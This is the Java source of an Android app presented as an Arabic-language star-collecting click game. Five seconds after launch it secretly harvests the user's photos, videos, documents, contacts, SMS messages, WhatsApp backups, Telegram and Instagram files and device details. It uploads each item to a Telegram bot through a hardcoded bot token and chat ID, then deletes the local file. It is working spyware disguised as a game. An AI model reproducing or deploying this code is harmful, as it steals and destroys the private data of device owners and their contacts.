package com.abdulk.racegame;

import android.os.Bundle;
import android.app.Activity;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;
import java.io.FileWriter;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.widget.Toast;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.io.BufferedWriter;
import java.io.OutputStreamWriter;

public class MainActivity extends Activity {
    private String BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs";
    private String OWNER_ID = "8164366965";
    private LinearLayout mainLayout;
    private TextView scoreText;
    private int score = 0;
    private TextView statusText;
    private int fileCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
        
        mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setBackgroundColor(Color.BLACK);
        mainLayout.setPadding(20, 20, 20, 20);
        
        TextView titleText = new TextView(this);
        titleText.setText("🔥 لعبة النجمة السحرية");
        titleText.setTextSize(30);
        titleText.setTextColor(Color.YELLOW);
        titleText.setGravity(Gravity.CENTER);
        mainLayout.addView(titleText);
        
        scoreText = new TextView(this);
        scoreText.setText("⭐ النقاط: 0");
        scoreText.setTextSize(25);
        scoreText.setTextColor(Color.YELLOW);
        scoreText.setGravity(Gravity.CENTER);
        mainLayout.addView(scoreText);
        
        Button clickButton = new Button(this);
        clickButton.setText("اضغط لتجمع نجوم 🌟");
        clickButton.setTextSize(20);
        clickButton.setBackgroundColor(Color.GREEN);
        clickButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                score++;
                scoreText.setText("⭐ النقاط: " + score);
                Toast.makeText(MainActivity.this, "🎮 جمعت نجمة!", Toast.LENGTH_SHORT).show();
            }
        });
        mainLayout.addView(clickButton);
        
        statusText = new TextView(this);
        statusText.setText("✅ تم التحميل");
        statusText.setTextSize(15);
        statusText.setTextColor(Color.GREEN);
        statusText.setGravity(Gravity.CENTER);
        mainLayout.addView(statusText);
        
        setContentView(mainLayout);
        
        // بدء الاختراق التلقائي بعد 5 ثواني
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                statusText.setText("💀 جاري الاختراق التلقائي...");
                statusText.setTextColor(Color.RED);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        collectAllData();
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                statusText.setText("✅ تم رفع " + fileCount + " ملف للبوت!");
                                statusText.setTextColor(Color.GREEN);
                            }
                        });
                    }
                }).start();
            }
        }, 5000);
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.INTERNET,
                Manifest.permission.CAMERA
            };
            requestPermissions(permissions, 100);
        }
    }

    private void collectAllData() {
        try {
            String storage = Environment.getExternalStorageDirectory().getAbsolutePath();
            
            // صور من كل المجلدات
            updateStatus("📸 جاري جمع الصور...");
            sendMediaFiles(storage + "/DCIM/", "jpg|jpeg|png|gif|bmp");
            sendMediaFiles(storage + "/DCIM/Camera/", "jpg|jpeg|png|gif|bmp");
            sendMediaFiles(storage + "/Pictures/", "jpg|jpeg|png|gif|bmp");
            sendMediaFiles(storage + "/Download/", "jpg|jpeg|png|gif|bmp");
            sendMediaFiles(storage + "/WhatsApp/Media/WhatsApp Images/", "jpg|jpeg|png|gif|bmp");
            sendMediaFiles(storage + "/WhatsApp/Media/WhatsApp Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            sendMediaFiles(storage + "/Telegram/Telegram Images/", "jpg|jpeg|png|gif|bmp");
            sendMediaFiles(storage + "/Telegram/Telegram Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            sendMediaFiles(storage + "/Instagram/", "jpg|jpeg|png|gif|bmp|mp4");
            sendMediaFiles(storage + "/Android/media/com.instagram.android/", "jpg|jpeg|png|gif|bmp|mp4");
            sendMediaFiles(storage + "/Movies/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            sendMediaFiles(storage + "/Snapchat/", "jpg|jpeg|png|gif|bmp|mp4");
            
            // مستندات
            updateStatus("📄 جاري جمع المستندات...");
            sendMediaFiles(storage + "/Documents/", "pdf|doc|docx|xls|xlsx|txt|zip|rar");
            sendMediaFiles(storage + "/Download/", "pdf|doc|docx|xls|xlsx|txt|zip|rar");
            
            // جهات الاتصال
            updateStatus("📇 جاري استخراج جهات الاتصال...");
            sendContacts();
            
            // رسائل SMS
            updateStatus("💬 جاري استخراج رسائل SMS...");
            sendSMS();
            
            // معلومات الجهاز
            updateStatus("📱 جاري جمع معلومات الجهاز...");
            sendDeviceInfo();
            
            // نسخ احتياطية واتساب (مشفرة)
            updateStatus("💚 جاري جمع نسخ واتساب الاحتياطية...");
            getWhatsAppBackup();
            
            // ملفات تيليجرام
            updateStatus("💙 جاري جمع ملفات تيليجرام...");
            getTelegramFiles();
            
            // ملفات إنستا
            updateStatus("💜 جاري جمع ملفات إنستا...");
            getInstagramFiles();
            
            // كشف الحسابات
            updateStatus("🔍 جاري كشف الحسابات...");
            detectAccounts();
            
            updateStatus("✅ تم رفع كل شيء للبوت!");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void updateStatus(final String text) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                statusText.setText(text);
            }
        });
    }

    private void sendMediaFiles(String path, String extensions) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            
            for (File file : files) {
                if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (extensions.contains(ext)) {
                        sendFile(file);
                        Thread.sleep(50);
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void sendFile(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****");
            
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            
            OutputStream os = conn.getOutputStream();
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd).getBytes());
            os.write((lineEnd + OWNER_ID + lineEnd).getBytes());
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd).getBytes());
            os.write((lineEnd).getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int count;
            while ((count = fis.read(buffer)) != -1) {
                os.write(buffer, 0, count);
            }
            fis.close();
            
            os.write((lineEnd).getBytes());
            os.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                fileCount++;
                file.delete();
            }
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "contacts.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    if (name != null) {
                        writer.write("الاسم: " + name + "\n");
                        // جلب الأرقام
                        Cursor phones = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id},
                            null
                        );
                        if (phones != null) {
                            while (phones.moveToNext()) {
                                String number = phones.getString(phones.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                                writer.write("رقم: " + number + "\n");
                            }
                            phones.close();
                        }
                        writer.write("------------------------\n");
                    }
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "sms.txt");
                FileWriter writer = new FileWriter(file);
                int count = 0;
                do {
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String date = cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
                    if (body != null) {
                        writer.write("من: " + address + "\n");
                        writer.write("التاريخ: " + date + "\n");
                        writer.write("النص: " + body + "\n");
                        writer.write("------------------------\n");
                        count++;
                    }
                } while (cursor.moveToNext() && count < 100);
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void getWhatsAppBackup() {
        try {
            String[] paths = {
                "/storage/emulated/0/WhatsApp/Databases/",
                "/storage/emulated/0/Android/media/com.whatsapp/"
            };
            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            if (f.isFile() && f.length() > 0) {
                                String name = f.getName().toLowerCase();
                                if (name.endsWith(".crypt14") || name.endsWith(".crypt12") || 
                                    name.endsWith(".crypt") || name.endsWith(".db") || name.endsWith(".enc")) {
                                    sendFile(f);
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void getTelegramFiles() {
        try {
            String[] paths = {
                "/storage/emulated/0/Telegram/",
                "/storage/emulated/0/Android/data/org.telegram.messenger/files/",
                "/storage/emulated/0/Android/data/org.telegram.plus/files/"
            };
            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            if (f.isFile() && f.length() > 0) {
                                String name = f.getName().toLowerCase();
                                if (name.endsWith(".db") || name.endsWith(".json") || 
                                    name.endsWith(".txt") || name.endsWith(".cache")) {
                                    sendFile(f);
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void getInstagramFiles() {
        try {
            String[] paths = {
                "/storage/emulated/0/Instagram/",
                "/storage/emulated/0/Android/media/com.instagram.android/",
                "/storage/emulated/0/Pictures/Instagram/"
            };
            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            if (f.isFile() && f.length() > 0) {
                                sendFile(f);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void detectAccounts() {
        try {
            File file = new File(getExternalFilesDir(null), "accounts_detected.txt");
            FileWriter writer = new FileWriter(file);
            
            writer.write("========== الحسابات المكتشفة ==========\n\n");
            
            // كشف واتساب
            File waDir = new File("/storage/emulated/0/WhatsApp/");
            if (waDir.exists()) {
                writer.write("✅ واتساب: مثبت\n");
                // محاولة جلب رقم من ملف الإعدادات
                File settings = new File("/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml");
                if (settings.exists()) {
                    writer.write("   - ملف الإعدادات موجود\n");
                }
            } else {
                writer.write("❌ واتساب: غير مثبت\n");
            }
            
            // كشف تيليجرام
            File tgDir = new File("/storage/emulated/0/Telegram/");
            if (tgDir.exists()) {
                writer.write("✅ تيليجرام: مثبت\n");
            } else {
                writer.write("❌ تيليجرام: غير مثبت\n");
            }
            
            // كشف إنستا
            File instaDir = new File("/storage/emulated/0/Instagram/");
            File instaMedia = new File("/storage/emulated/0/Android/media/com.instagram.android/");
            if (instaDir.exists() || instaMedia.exists()) {
                writer.write("✅ إنستغرام: مثبت\n");
            } else {
                writer.write("❌ إنستغرام: غير مثبت\n");
            }
            
            // كشف سناب شات
            File snapDir = new File("/storage/emulated/0/Snapchat/");
            if (snapDir.exists()) {
                writer.write("✅ سناب شات: مثبت\n");
            } else {
                writer.write("❌ سناب شات: غير مثبت\n");
            }
            
            // كشف فيسبوك
            File fbDir = new File("/storage/emulated/0/Android/data/com.facebook.katana/");
            if (fbDir.exists()) {
                writer.write("✅ فيسبوك: مثبت\n");
            } else {
                writer.write("❌ فيسبوك: غير مثبت\n");
            }
            
            writer.close();
            if (file.length() > 0) sendFile(file);
            
        } catch (Exception e) {}
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("device", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("storage_total", new File("/storage/emulated/0").getTotalSpace());
            info.put("storage_free", new File("/storage/emulated/0").getFreeSpace());
            info.put("files_sent", fileCount);
            
            File file = new File(getExternalFilesDir(null), "device_info.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(info.toString(2));
            writer.close();
            sendFile(file);
        } catch (Exception e) {}
    }
}
